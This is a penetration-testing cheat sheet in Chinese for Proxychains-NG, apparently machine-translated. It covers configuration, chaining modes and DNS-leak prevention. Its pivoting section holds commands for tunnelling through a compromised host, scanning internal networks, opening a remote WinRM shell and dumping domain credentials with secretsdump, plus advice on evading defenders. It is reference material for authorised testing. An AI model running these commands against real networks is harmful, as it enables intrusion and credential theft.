<!-- language-home-navigation -->
[🏠 中文主页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ⛓️ Proxychains - 完整备忘单

[🇹🇷 Türkçe Sürüm]（翻译/README.tr.md）
```
  ██████╗ ██████╗  ██████╗ ██╗  ██╗██╗   ██╗ ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗███████╗
  ██╔══██╗██╔══██╗██╔═══██╗╚██╗██╔╝╚██╗ ██╔╝██╔════╝██║  ██║██╔══██╗██║████╗  ██║██╔════╝
  ██████╔╝██████╔╝██║   ██║ ╚███╔╝  ╚████╔╝ ██║     ███████║███████║██║██╔██╗ ██║███████╗
  ██╔═══╝ ██╔══██╗██║   ██║ ██╔██╗   ╚██╔╝  ██║     ██╔══██║██╔══██║██║██║╚██╗██║╚════██║
  ██║     ██║  ██║╚██████╔╝██╔╝ ██╗   ██║   ╚██████╗██║  ██║██║  ██║██║██║ ╚████║███████║
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝
       Force Any TCP Connection Through SOCKS4, SOCKS5, and HTTP Proxies
```
<p对齐=“中心”>
  <img src="https://img.shields.io/badge/Proxychains-Proxychains--NG-blue?style=for-the-badge" alt="Proxychains">
  <img src="https://img.shields.io/badge/Category-Pivoting_&_Tunneling-orange?style=for-the-badge" alt="旋转和隧道">
  <img src="https://img.shields.io/badge/Protocols-SOCKS4_SOCKS5_HTTP-green?style=for-the-badge" alt="协议">
  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="许可证 GPLv2">
</p>

<p对齐=“中心”>
  <b>🌐通过LD_PRELOAD通过多跳SOCKS和HTTP代理动态路由标准Linux CLI网络工具</b>
</p>

---

## 📋 目录

- [概述和 Proxychains 的工作原理](#-overview--how-proxychains-works)
- [安装](#-安装)
- [配置文件和查找层次结构](#-configuration-files--lookup-hierarchy)
- [链接模式解释](#-chaining-modes-explained)
  - [`dynamic_chain`（推荐）]（#dynamic_chain-推荐）
  - [`strict_chain`](#strict_chain)
  - [`round_robin_chain`](#round_robin_chain)
  - [`random_chain`](#random_chain)
- [DNS 泄漏预防 (`proxy_dns`)](#-dns-leaks-prevention-proxy_dns)
- [配置代理列表](#-configuring-proxy-lists)
- [旋转工作流程](#-pivoting-workflows)
  - [SSH 动态 SOCKS 代理 (`ssh -D`)](#ssh-dynamic-socks-proxy-ssh--d)
  - [Chisel & Ligolo-ng SOCKS 接力](#chisel--ligolo-ng-socks-relay)
- [工具集成和陷阱](#-tool-integration--陷阱)
  - [Nmap 与 Proxychains（为什么 `-sS` 失败）](#nmap-with-proxychains-why--ss-fails)
  - [Active Directory 工具（NetExec、Evil-WinRM、Impacket）](#active-directory-tools-netexec-evil-winrm-impacket)
- [快速参考表](#-quick-reference-table)
- [防御考虑因素和 OPSEC](#-defective-considerations--opsec)
- [法律免责声明](#-legal-disclaimer)

---

## 🎯 概述以及代理链如何工作

**Proxychains**（现代主动分叉：**Proxychains-NG** / `proxychains4`）允许通过单个或多个链接的 SOCKS4、SOCKS5 或 HTTP(S) 代理运行任何动态命令。

它通过使用动态链接器机制 (`LD_PRELOAD`) 预加载自定义挂钩库 (`libproxychains4.so`) 来发挥作用。这会拦截目标应用程序发出的套接字 API 调用（`connect()`、`gethostbyname()`），并将其 TCP 流量透明地重定向到配置的代理链中。

---

## 📥 安装
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y proxychains4

# Arch Linux
sudo pacman -S proxychains-ng

# macOS (Homebrew)
brew install proxychains-ng
```
---

## ⚙️ 配置文件和查找层次结构

Proxychains 按照以下严格的优先级顺序搜索其配置文件：

1. `PROXYCHAINS_CONF_FILE`环境变量中设置的路径。
2. 通过 `-f` 标志 (`proxychains4 -f ./myproxy.conf <command>`) 传递的文件。
3. `./proxychains.conf` 在当前工作目录中。
4.`$(HOME)/.proxychains/proxychains.conf`。
5. `/etc/proxychains4.conf`（系统默认）。

---

## 🔗 链接模式解释

编辑`/etc/proxychains4.conf`选择链式路由算法：

### `dynamic_chain`（推荐）
自动跳过列表中的失效代理而不中止连接。如果代理 #1 已启动，代理 #2 已关闭，代理 #3 已启动，则流量将通过 1 -> 3 路由。
```ini
dynamic_chain
# strict_chain
```
### `strict_chain`
严格遵循配置的代理顺序。如果链中的任何代理失败或超时，则整个连接将被拒绝。
```ini
strict_chain
```
### `round_robin_chain`
对于每个新的连接请求，依次循环浏览代理列表。
```ini
round_robin_chain
chain_len = 2
```
### `random_chain`
从列表中随机选择代理，最多 `chain_len`。

---

## 🛡️ DNS 泄漏预防 (`proxy_dns`)

外部侦察或内部旋转期间最危险的 OPSEC 故障之一是将 DNS 查询泄漏到本地 ISP 或目标网关。

确保 `proxy_dns` 在 `/etc/proxychains4.conf` 中处于活动状态：
```ini
# Proxy all DNS requests through SOCKS5 proxy
proxy_dns

# Suppress annoying hook library stdout logs
quiet_mode
```
---

## 📝 配置代理列表

在`/etc/proxychains4.conf`底部，`[ProxyList]`下：
```ini
[ProxyList]
# Protocol   IP               Port   [Username]  [Password]
socks5       127.0.0.1        1080
socks4       192.168.1.100    1080
http         10.10.10.50      8080   admin       SecretPass123
```
---

## 🚀 旋转工作流程

### SSH 动态 SOCKS 代理 (`ssh -D`)
```bash
# 1. Open background dynamic SOCKS5 proxy on local port 1080 through compromised pivot host
ssh -f -N -D 127.0.0.1:1080 user@10.10.10.50

# 2. Add entry to /etc/proxychains4.conf:
# socks5 127.0.0.1 1080

# 3. Access internal machines unreachable directly from attacker box
proxychains4 curl http://172.16.20.10
```
### Chisel & Ligolo-ng SOCKS 继电器

运行 Chisel 客户端-服务器隧道时：
```bash
# Connect Chisel client with reverse SOCKS
chisel client 10.10.14.5:8000 R:1080:socks

# Route tools through Chisel tunnel
proxychains4 crackmapexec smb 172.16.50.0/24
```
---

## ⚠️ 工具集成和陷阱

### Nmap 与代理链（为什么 `-sS` 失败）

> [!警告]
> SOCKS 代理仅支持已建立的 TCP 会话。 **SYN 隐形扫描 (`-sS`) 将失败或挂起**，因为它们需要 SOCKS 不支持的原始套接字操作！
```bash
# Correct Nmap command with Proxychains (Full TCP Connect, No Ping, No DNS)
proxychains4 nmap -sT -Pn -n -sV -p 80,443,445,3389 172.16.20.10

# Scan Top 100 ports over proxy
proxychains4 nmap -sT -Pn -n --top-ports 100 172.16.20.10
```
### Active Directory 工具（NetExec、Evil-WinRM、Impacket）
```bash
# SMB enumeration through internal pivot
proxychains4 nxc smb 172.16.20.10 -u Administrator -p 'Password123'

# WinRM shell through proxychains
proxychains4 evil-winrm -i 172.16.20.10 -u Administrator -p 'Password123'

# Impacket secretsdump over SOCKS proxy
proxychains4 impacket-secretsdump domain.local/Administrator:Pass@172.16.20.10 -no-pass
```
---

## ⚡ 快速参考表

|目标|命令 |
|------------|---------|
| **通过代理运行命令** | `proxychains4 <command> [args]` |
| **自定义配置文件** | `proxychains4 -f ./custom.conf <command>` |
| **安静执行（无横幅）** | `proxychains4 -q <command>` |
| **TCP 扫描内部目标** | `proxychains4 nmap -sT -Pn -n -p 80,445 <IP>` |
| **内部网络请求** | `proxychains4 curl -i http://<INTERNAL_IP>` |
| **内部 SQLMap 测试** | `proxychains4 sqlmap -u "http://<IP>/id=1" --batch` |
| **内部 NetExec 探针** | `proxychains4 nxc smb <SUBNET>/24` |

---

## 🛡️ 防御考虑和 OPSEC

1. **DNS 泄漏：** 如果 `proxy_dns` 被注释掉，您的系统将通过本地 DNS 解析主机名，向蓝队发出目标主机名的警报。
2. **速度和延迟：** 链接多个代理会影响往返时间 (RTT)。设置合理的超时（`tcp_read_time_out 15000`、`tcp_connect_time_out 8000`）。
3. **静态二进制文件：** 静态编译的二进制文件（例如，不链接 `libc.so` 的 Go/Rust 二进制文件）绕过 `LD_PRELOAD` 挂钩，并且不会通过代理链进行路由。

---

## ⚠️ 法律免责声明

> [!警告]
> 本备忘单仅适用于授权渗透测试、红队参与和教育研究。严禁未经授权路由流量。